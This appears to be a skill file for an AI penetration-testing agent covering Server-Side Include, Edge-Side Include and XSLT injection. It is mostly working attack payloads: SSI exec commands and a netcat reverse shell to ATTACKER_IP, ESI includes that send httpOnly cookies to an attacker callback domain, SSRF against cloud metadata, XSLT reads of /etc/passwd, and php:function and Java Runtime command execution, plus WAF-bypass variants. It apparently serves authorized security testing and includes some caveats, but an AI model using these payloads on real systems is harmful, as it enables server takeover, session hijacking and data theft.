---
name: ssi-esi-xslt
description: Server-Side Includes (SSI), Edge-Side Includes (ESI), and XSLT Injection. Use when HauntMode flags these as APPLIES/MAYBE, when the target serves .shtml/.shtm/.stm files, when response headers include Surrogate-Control ESI/1.0, when user input is embedded in XML/XSL transformations, or when testing template/import/transform functionality that processes XML. Three separate attack classes in one skill.
---

# SSI / ESI / XSLT Injection

This skill covers three related server-side injection classes that are often overlooked: Server-Side Includes (SSI), Edge-Side Includes (ESI), and XSLT Injection. All three involve server or proxy evaluation of markup/directives injected by an attacker.

---

## 1. Triggers — when this skill applies

### SSI triggers
- File extensions `.shtml`, `.shtm`, `.stm` anywhere on the target
- Apache or IIS detected (both support SSI natively)
- Input fields whose output appears in a page that includes dynamic server-generated content
- Upload features that allow HTML/SHTML files
- Any page that writes user input to a file served by the web server
- Error messages that "echo" back user input as a server-generated page

### ESI triggers
- Response header `Surrogate-Control: content="ESI/1.0"` present
- Target sits behind a CDN, reverse proxy, or caching layer (Varnish, Squid, Nginx, Akamai, Fastly, Cloudflare)
- Input is reflected in a response that is proxied/cached before delivery
- Any indication of Varnish (`Via: varnish`, `X-Varnish` header), Squid, or Akamai
- Blind approach required — ESI is usually not advertised

### XSLT triggers
- Application accepts XML input for transformation
- Upload of XSL/XSLT stylesheets
- Parameters named `xsl`, `xslt`, `transform`, `stylesheet`, `template`
- Application produces reports, PDFs, or formatted output from XML data
- SOAP web services (XSLT often used in XML processing pipelines)
- Oracle database-integrated web apps (Oracle supports XSLT natively)
- Error messages referencing Saxon, Xalan, libxslt, or "stylesheet"

---

---

## 3. 30-second triage

### SSI — drop these into every reflected input field:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="id" -->
<!--#printenv -->
```

If the response contains a date, a UID string, or environment variable values instead of the literal `<!--#...-->` text — SSI injection is confirmed.

### ESI — inject into headers and body parameters:

```
<esi:include src="YOUR_EZXSS_DOMAIN/esi-probe"/>
<esi:debug/>
```

ESI is almost always blind — watch for an OOB callback at the ezXSS dashboard, not in-band reflection.

### XSLT — inject into XML/XSL inputs:

```xml
<xsl:value-of select="system-property('xsl:version')"/>
```

If the response contains a version number like `1.0`, `2.0`, or `3.0` instead of the literal string — XSLT injection is confirmed.

---

## 4. SSI — Detection and Exploitation

### 4.1 Directive syntax

```
<!--#name param1="value1" param2="value2" -->
```

### 4.2 Detection payloads (benign — confirm evaluation before escalating)

```
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#printenv -->
```

`DATE_LOCAL` returns the current server time. If the literal `<!--#echo...-->` appears in the response, SSI is not being processed.

### 4.3 Command execution (RCE)

```
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="hostname" -->
<!--#exec cmd="uname -a" -->
```

**Reverse shell via SSI:**

```
<!--#exec cmd="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f" -->
```

### 4.4 File inclusion (LFI)

Only allows files within the web root:

```
<!--#include virtual="/etc/passwd" -->
<!--#include virtual="index.html" -->
<!--#include file="secret.txt" -->
```

Note: `virtual` uses a path relative to the web root; `file` uses a path relative to the current document.

### 4.5 Information disclosure

```
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
<!--#config errmsg="INJECTION_TEST" -->
```

### 4.6 Upload-based SSI injection

If the application allows HTML/SHTML file uploads:
1. Create a file with `.shtml` extension containing `<!--#exec cmd="id" -->`
2. Upload it to a web-accessible directory
3. Browse to the uploaded file URL
4. If SSI is enabled server-wide or for the upload path, the directive executes

---

## 5. ESI — Detection and Exploitation

### 5.1 Detection (always blind first)

Look for `Surrogate-Control: content="ESI/1.0"` in response headers. If absent, still probe blindly — most configurations don't advertise it.

**Blind OOB probe** — inject into reflected parameters, headers, or body fields:

```html
<esi:include src="YOUR_EZXSS_DOMAIN/esi-probe?from=FIELDNAME"/>
```

Check ezXSS dashboard for callbacks. A hit confirms ESI injection.

Also try:

```html
<esi:debug/>
```

Akamai processes `<esi:debug/>` and may return debug information in the response body.

### 5.2 GoSecure ESI capability matrix

| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Allowlist |
|---|---|---|---|---|---|
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | No |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No | No |
| Akamai (prod) | Yes | No | No | No | Yes |
| Drupal ESI module | Yes | No | No | No | No |

### 5.3 XSS via ESI (when Vars supported)

```html
<esi:include src="YOUR_EZXSS_DOMAIN/xss.html"/>
```

Where `xss.html` on your server contains a JavaScript XSS payload. ESI fetches and inlines the content — the victim's browser renders the injected JS.

### 5.4 Cookie stealing via ESI (bypasses httpOnly)

The ESI engine runs server-side and has access to `HTTP_COOKIE` even when cookies are httpOnly:

```html
<esi:include src="YOUR_EZXSS_DOMAIN/c?c=$(HTTP_COOKIE)"/>
```

Check ezXSS dashboard for the cookie values.

### 5.5 SSRF via ESI

```html
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://127.0.0.1:8080/admin"/>
<esi:include src="http://internal-service.local/secret"/>
```

If the ESI processor fetches the URL and inlines the response, you get both SSRF and content disclosure.

### 5.6 ESI filter bypass tags

Some WAFs block `<esi:include` literally. Try these bypass variants:

```html
<esi:include src="YOUR_EZXSS_DOMAIN/"/>
<esi:remove><script>alert(1)</script></esi:remove>
<!--esi <esi:include src="YOUR_EZXSS_DOMAIN/"/> -->
<esi:comment text="this is processed"/>
```

The `<esi:remove>` tag contains content that ESI processors discard — useful for bypassing WAF rules that look for script tags. The `<!--esi ... -->` comment syntax is processed by some ESI engines.

---

## 6. XSLT — Detection, Fingerprinting, and Exploitation

### 6.1 Detection and fingerprinting

Inject into any XSL/XML parameter or file upload. The goal is to confirm the processor evaluates your input.

**Version probe** (works across all processors):

```xml
<xsl:value-of select="system-property('xsl:version')"/>
```

**Full fingerprinting payload** — inject as standalone XSLT or embed in existing XSL context:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    Version: <xsl:value-of select="system-property('xsl:version')"/>
    Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
    Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Expected responses by processor:**

| Processor | Version | Vendor string |
|---|---|---|
| Saxon 9.x | 2.0 | SAXON 9.x.x from Saxonica |
| Saxon HE/EE | 3.0 | Saxonica |
| Xalan-J | 1.0 | Apache Software Foundation |
| libxslt | 1.0 | libxslt |
| .NET XslCompiledTransform | 1.0 | Microsoft |

### 6.2 Local file read (LFI)

Available in Saxon (XSLT 2.0+) via `unparsed-text()`:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
  <xsl:template match="/">
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
  </xsl:template>
</xsl:stylesheet>
```

Available across all processors via `document()` (reads XML files — less useful for `/etc/passwd` but useful for XML config files):

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/xml/catalog')"/>
  </xsl:template>
</xsl:stylesheet>
```

### 6.3 RCE via PHP extension (php:function)

Only available when PHP's XSL extension is used with `registerPHPFunctions()` enabled:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Other PHP functions via this vector:**

```xml
<xsl:value-of select="php:function('passthru', 'id')"/>
<xsl:value-of select="php:function('shell_exec', 'id')"/>
<xsl:value-of select="php:function('phpinfo')"/>
```

**PHP file read:**

```xml
<xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/>
```

### 6.4 SSRF via xsl:include

The `xsl:include` directive causes the XSLT processor to make a network request to fetch a remote stylesheet:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:include href="http://127.0.0.1:8080/internal-stylesheet"/>
  <xsl:template match="/"></xsl:template>
</xsl:stylesheet>
```

**Port scan via response timing:** if the processor returns different errors for open vs. closed ports, you can enumerate internal ports. From the notes:
- Open port: `java.net.ConnectException: Connection refused`
- Closed port: `java.io.FileNotFoundException`

**SSRF to OOB callback:**

```xml
<xsl:include href="YOUR_EZXSS_DOMAIN/xslt-ssrf-probe"/>
```

### 6.5 XSLT wordlist for brute-forcing

```
[RUN THIS]
curl -s https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/xslt.txt -o /tmp/xslt-wordlist.txt
```

Use with ffuf against endpoints that accept stylesheet or template parameters.

---

## 7. Bypass techniques

### 7.1 SSI — when `<!--#exec` is disabled

Apache can disable the `exec` directive while leaving other directives enabled. Fallback to:

```
<!--#include virtual="/proc/self/environ" -->
<!--#printenv -->
```

If `exec` is disabled but `include` is not, you can still read files via `virtual`.

### 7.2 SSI — WAF evasion

```
<!--#exec cmd="id"-->
<!--#exec   cmd="id" -->
<!--#EXEC CMD="id" -->
```

Whitespace variations and case variations may bypass naive WAF rules.

### 7.3 ESI — tag obfuscation

```html
<!--esi-->
<esi:include src="YOUR_EZXSS_DOMAIN/"/>
<!--/esi-->
```

Some processors handle comment-wrapped ESI syntax. Also:

```html
<esi:vars>$(HTTP_COOKIE)</esi:vars>
```

The `<esi:vars>` tag alone can leak cookie values when reflection is available.

### 7.4 XSLT — when PHP functions are blocked

Try Java-specific functions (Xalan/Saxon):

```xml
<xsl:value-of select="runtime:exec(runtime:getRuntime(), 'id')"
              xmlns:runtime="java.lang.Runtime"/>
```

Or for Saxon specifically:

```xml
<xsl:value-of select="saxon:system-id()" xmlns:saxon="http://saxon.sf.net/"/>
```

---

## 8. False-positive checks

- **SSI literal in response** — `<!--#echo var="DATE_LOCAL" -->` appears verbatim: SSI is not active on this endpoint. Check if `.shtml` endpoints exist elsewhere on the target.
- **ESI no callback** — absence of OOB callback doesn't rule out ESI; the processor may have a host allowlist. Try including a host on the allowlist if one is discoverable from the application.
- **XSLT version reflected from user input** — if you submit `xsl:version=2.0` as a parameter and it's reflected as `2.0` without any actual XSL processing happening, that's not XSLT injection. Confirm by trying a `system-property()` expression — static string reflection is not injection.
- **XSLT `php:function` not available** — `php:function()` only works when `XSLTProcessor::registerPHPFunctions()` was called in the PHP source. Most secure PHP XSLT setups don't call this. Fall back to `unparsed-text()` or `document()`.
- **ESI debug response confusion** — `<esi:debug/>` may return HTML-looking content even on servers that don't support ESI (some frameworks reflect unknown XML-like tags). Only treat it as confirmed if the response contains recognizable ESI debug fields.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| SSI exec in uploaded file | `file-upload` | RCE via file upload |
| ESI include → cookie leak | `session-attacks` | Session hijacking via httpOnly bypass |
| ESI include → XSS delivery | `xss` | Stored XSS via ESI fetch |
| ESI SSRF → cloud metadata | `ssrf` | IAM credential exfiltration |
| XSLT `xsl:include` → SSRF | `ssrf` | Internal port scan, metadata access |
| XSLT `unparsed-text` → LFI | `lfi` | Source code, config file disclosure |
| XSLT `php:function` → RCE | `cmdi` | Full server takeover |
| XSLT in SOAP request | `xxe` | XXE via dca=xslt parameter |
| SSI in blind context (email/log) | `xss` | Blind RCE similar to blind SSTI |

---

## 10. Reporting template

```
POTENTIAL FINDING: [SSI / ESI / XSLT] Injection
Target: <full URL of injection point>
Parameter: <param name + location: query/body/header/upload>
Injection class: <SSI | ESI | XSLT>
Processor/engine: <Apache SSI | Varnish | Akamai | Saxon 9.x | Xalan | libxslt | PHP XSL>
Detection evidence:
    <e.g. "<!--#echo var='DATE_LOCAL'--> returned current server time"
     or "ESI OOB callback received at YOUR_EZXSS_DOMAIN from target IP"
     or "system-property('xsl:version') returned '2.0', vendor 'SAXON 9.1.0.8'">
Working exploit payload:
    <exact payload>
Exploit confirmation:
    <output of id/whoami/hostname or file contents read or OOB callback URL>
Impact:
    <e.g. "Remote code execution as www-data via SSI exec directive" OR
     "File read of /etc/passwd via XSLT unparsed-text()" OR
     "Cookie theft of httpOnly session cookie via ESI vars">
Chain potential: <list other skills/findings combined>
Next step: <e.g. "Develop reverse shell via SSI exec" OR "Read app config files via XSLT LFI" OR "Confirm ESI SSRF to cloud metadata">
```

---

## 11. Recon tracker vector strings

Only log if the user explicitly authorizes (see CLAUDE.md "CRITICAL RULE"):

- `ssi:detected:<param>` — SSI directive evaluated
- `ssi:rce:<param>` — exec directive confirmed
- `ssi:lfi:<param>` — file include confirmed
- `ssi:blind:<param>` — SSI executed but output not directly visible
- `esi:detected:<param>` — OOB callback received from ESI include
- `esi:cookie-theft` — HTTP_COOKIE accessible via ESI vars
- `esi:ssrf:<target>` — internal resource fetched via esi:include
- `xslt:fingerprinted:<processor>` — processor/version identified
- `xslt:lfi` — file read via unparsed-text() or document()
- `xslt:rce:php-function` — RCE via php:function() confirmed
- `xslt:ssrf` — SSRF via xsl:include confirmed
- `ssi:no:<param>` — SSI syntax reflected literally, not processed
- `esi:no:<param>` — ESI probed, no OOB callback, no ESI headers

---

## 12. What NOT to do

- **Do not run `<!--#exec cmd="rm -rf"-->` or any destructive commands** on production. Use `id`, `whoami`, `hostname`, `uname -a` for proof.
- **Do not chain XSLT php:function to a webshell** without authorization — the escalation path is clear enough to document without deploying persistent access.
- **Do not assume ESI is absent because `Surrogate-Control` is missing** — always probe with an OOB payload. Most production ESI deployments don't advertise the header.
- **Do not report SSI injection from file extension alone** — `.shtml` extension is a hint, not confirmation. Confirm with a benign evaluation like `<!--#echo var="DATE_LOCAL"-->`.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not rely on `php:function()` as the primary XSLT vector** — it requires a specific PHP configuration. Always try `system-property()` fingerprinting and `unparsed-text()` LFI first.
- **Do not skip ESI host allowlist research** — if ESI includes are restricted to an allowlist, the vulnerability may still be exploitable against those allowed hosts (e.g., internal microservices on the same domain).
